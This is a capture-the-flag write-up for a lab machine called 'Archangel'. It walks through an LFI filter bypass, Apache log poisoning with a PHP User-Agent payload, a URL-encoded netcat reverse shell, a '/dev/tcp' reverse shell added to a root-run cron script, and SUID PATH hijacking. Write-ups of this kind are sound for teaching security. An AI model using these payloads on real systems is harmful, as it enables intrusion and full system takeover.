# Archangel

#Linux #WebExploitation #LFI #PrivEsc 

## Reconnaissance 

I started running nmap and I got the result:

```
$ nmap -sV -Pn 10.67.171.210 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 05:01 EST
Nmap scan report for 10.67.171.210
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accessing the main page, I got this following page.

<figure><img src="archangel-1.png" alt=""><figcaption></figcaption></figure>

## Exploiting

I noticed that it was displaying a new domain in "Send us a mail", `mafia.thm`. So I added this to `/etc/hosts`.

Searching for possible directories and files, I found `robots.txt`, which lead us to a file `/test.php`.

<figure><img src="archangel-3.png" alt=""><figcaption></figcaption></figure>

Clicking the button loads a file called `mrrobot.php`, which returns a phrase "Control is an illusion". There appears to be an LFI.


<figure><img src="archangel-4.png" alt=""><figcaption></figcaption></figure>
<figure><img src="archangel-5.png" alt=""><figcaption></figcaption></figure>

Intercepting the request using Burpsuite, I tried to load `/etc/passwd` file to check if it was vulnerable to an LFI attack. On the first attempt, it didn't work properly. I tried some PHP Wrappers like `php://filter`, but it didn't work either.

<figure><img src="archangel-6.png" alt=""><figcaption></figcaption></figure>
<figure><img src="archangel-7.png" alt=""><figcaption></figcaption></figure>

Of all my attempts, the one that worked was include the `mrrobot.php` file using `php://filter`. I was able to read the code on that page and check if it had any kind of filter.

<figure><img src="archangel-8.png" alt=""><figcaption></figcaption></figure>

As I suspected, there is a filter that checks if the file path includes `../..`, and if it does, it will be blocked.

<figure><img src="archangel-9.png" alt=""><figcaption></figcaption></figure>

In order to bypass that, I added a slash `/` and that way I was able to include any files I want (including other `/` is a valid syntax for reading a file in Linux).

<figure><img src="archangel-10.png" alt=""><figcaption></figcaption></figure>

The idea here is to infect the log and see if I can get a reverse shell. First, I tried infecting with a `id` command and it worked successfully.

```bash
$ curl -H "User-Agent: <?php echo system('id'); ?>" http://mafialive.thm
```

<figure><img src="archangel-11.png" alt=""><figcaption></figcaption></figure>

Now, I can get a reverse shell.

```bash
$ curl -H "User-Agent: <?php system(\$_GET['shell']); ?>" http://mafialive.thm
```

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&shell=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.183.77%201337%20%3E%2Ftmp%2Ff
```
<figure><img src="archangel-12.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

On `/etc/crontab` indicates this `/opt/helloworld.sh` runs with Archangel's privilege in 1 minute

```
$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

We can take a look at this file:

```
www-data@ubuntu:/opt$ cat helloworld.sh 
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt    

www-data@ubuntu:/opt$ bash helloworld.sh 
helloworld.sh: line 2: /opt/backupfiles/helloworld.txt: Permission denied
```



```
www-data@ubuntu:/opt$ echo "sh -i >& /dev/tcp/192.168.130.101/1337 0>&1" >> helloworld.sh
```





```
archangel@ubuntu:~/secret$ ls -la
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

archangel@ubuntu:~/secret$ ./backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

archangel@ubuntu:~/secret$ strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
...
```

The file backup is owned by the root and can be executed.

We can see `cp /home/user/archangel/myfiles/* /opt/backupfiles`



```
archangel@ubuntu:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

```
archangel@ubuntu:~/secret$ echo $PATH
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```


```
The Privilege Escalation Vector (PATH Variable Manipulation)

This technique exploits a misconfiguration where a program (often a script or an SUID binary) that runs with elevated privileges (like root) calls another program without an absolute path. 

**How the attack works:**

1. **Vulnerable Code:** A privileged script uses a relative command name, for example, `cp` instead of `/bin/cp`.
   
2. **Attacker Action:** The attacker has a low-privileged shell and checks if they have write permissions to any directories in the current user's `PATH` variable, or if they can modify the `PATH` variable itself.
   
3. **Malicious Binary:** The attacker creates a malicious executable file in a directory they control (e.g., `/tmp/`) and names it the same as the legitimate command (e.g., `cp`). The content of this malicious file is typically a command to spawn a root shell.
   
4. **PATH Manipulation:** The attacker then modifies their `PATH` environment variable to prioritize their malicious directory (e.g., `export PATH=/tmp:$PATH`).
   
5. **Execution:** When the vulnerable, privileged script is executed, the operating system's shell searches the `PATH` directories in order. It finds the attacker's malicious binary first and executes it with the script's elevated privileges (root), giving the attacker full system control.
```